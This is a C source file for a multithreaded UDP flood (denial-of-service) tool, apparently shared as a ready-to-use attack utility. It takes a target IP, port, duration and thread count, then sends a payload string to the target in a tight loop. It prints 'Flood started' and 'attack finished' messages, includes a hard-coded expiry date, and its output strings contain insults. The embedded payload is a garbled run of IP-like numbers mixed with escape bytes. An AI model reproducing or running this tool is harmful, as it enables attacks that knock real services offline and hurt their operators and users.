#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>

void usage() {
    printf("EXAMPLE: ./test 𝐧𝐚𝐡𝐢 𝐡𝐨 𝐫𝐚𝐡𝐚 𝐤𝐲𝐚 𝐥𝐚𝐮𝐝𝐞 😂\n");
    exit(1);
}

struct thread_data {
    char *ip;
    int port;
    int duration;
    time_t expiration_time; 
};

void *attack(void *arg) {
    struct thread_data *data = (struct thread_data *)arg;
    int sock;
    struct sockaddr_in server_addr;
    time_t endtime;

    char *payloads[] = {
        "\x28.4.204.144\x206.140.206.252\x37.62.221.138\x80.103.132.50\x245.225.158.128\x160.50.14.107\x121.126.0.46\x160.244.28.156\x98.86.208.77\x76.243.48.164\x33.71.162.205\x225.227.80.8\x36.48.199.31\x42.115.198.75\x138.59.91.19\x35.38.160.55\x223.84.235.189\x73.40.150.163\x91.126.77.244\x112.64.222.179\x218.141.179.121\x218.118.132.201\x187.221.181.80\x139.191.71.226\x109.78.24.202\x32.160.62.255\x164.183.103.229\x84.188.217.142\x173.65.244.155\x67.153.45.223\x36.189.185.56\x44.204.127.108\x100.247.239.146\x33.9.64.176\x51.2.24.247\x127.17.138.186\x73.170.224.7\x153.217.100.24\x202.115.140.215\x243.82.75.223\x47.254.67.27\x161.136.100.217\x65.193.208.13\x200.33.41.23\x254.36.252.188\x10.22.13.101\x126.0.239.53\x47.2.80.169\x36.171.184.72\x211.144.161.14\x254.172.166.110\x45.146.48.177\x197.149.103.4\x24.194.165.157\x132.51.180.176\x111.165.245.212\x111.64.81.44\x13.104.223.141\x8.133.73.202\x238.90.46.36\x57.134.65.81\x15.101.57.191\x237.11.81.80\x207.67.73.11\x10.115.208.71\x198.168.218.38\x104.62.168.203\x55.51.213.198\x242.130.255.110\x89.136.195.138\x149.201.162.138\x229.8.122.94\x208.103.208.60\x70.70.161.15\x185.153.101.75\x250.37.108.186\x152.122.29.168\x44.126.128.5\x183.1.101.89\x157.141.120.252\x91.232.150.88\x228.148.188.157\x66.233.223.60\x142.211.239.80\x9.39.67.224\x194.75.206.249\x5.105.242.55\x30.109.52.34\x164.196.93.170\x79.178.22.46\x33.194.118.53\x169.195.41.147\x75.112.168.180\x48.239.180.70\x156.247.154.129\x189.187.235.200\x25.56.43.170\x192.152.12.16\x147.95.140.123\x37.145.35.172", 
    };

    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(data->port);
    server_addr.sin_addr.s_addr = inet_addr(data->ip);

    endtime = time(NULL) + data->duration;

    while (time(NULL) <= endtime) {
        for (int i = 0; i < sizeof(payloads) / sizeof(payloads[0]); i++) {
            if (sendto(sock, payloads[i], strlen(payloads[i]), 0,
                         (const struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
                perror("Send failed");
                close(sock);
                pthread_exit(NULL);
            }
        }
    }

    close(sock);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        usage();
    }

    char *ip = argv[1];
    int port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    int threads = atoi(argv[4]);

    pthread_t *thread_ids = malloc(threads * sizeof(pthread_t));
    struct thread_data data = {ip, port, duration};

    struct tm expiration_tm = {0};
    expiration_tm.tm_year = 2025 - 1900; 
    expiration_tm.tm_mon = 0; 
    expiration_tm.tm_mday = 25; 
    expiration_tm.tm_hour = 23; 
    expiration_tm.tm_min = 59; 
    expiration_tm.tm_sec = 59; 

    data.expiration_time = mktime(&expiration_tm);

    if (data.expiration_time == -1) {
        perror("Error setting expiration time");
        exit(1);
    }

    if (time(NULL) >= data.expiration_time) {
        printf("Attack has expired. Exiting.\n"); 
        return 0; 
    }

    printf("Flood started on %s:%d for %d seconds with %d threads\n", ip, port, duration, threads);

    for (int i = 0; i < threads; i++) {
        if (pthread_create(&thread_ids[i], NULL, attack, (void *)&data) != 0) {
            perror("Thread creation failed");
            free(thread_ids);
            exit(1);
        }
        printf("Launched thread with ID: %lu\n", thread_ids[i]);
    }

    for (int i = 0; i < threads; i++) {
        pthread_join(thread_ids[i], NULL);
    }

    free(thread_ids);

    printf("𝐚𝐭𝐭𝐚𝐜𝐤 𝐟𝐢𝐧𝐢𝐬𝐡𝐞𝐝🖕 𝐛𝐲 𝐭𝐞𝐫𝐚 𝐛𝐚𝐚𝐩 𝐆𝐎𝐃𝐱𝐀𝐥𝐨𝐧𝐞𝐁𝐎𝐘\n");
    return 0;
}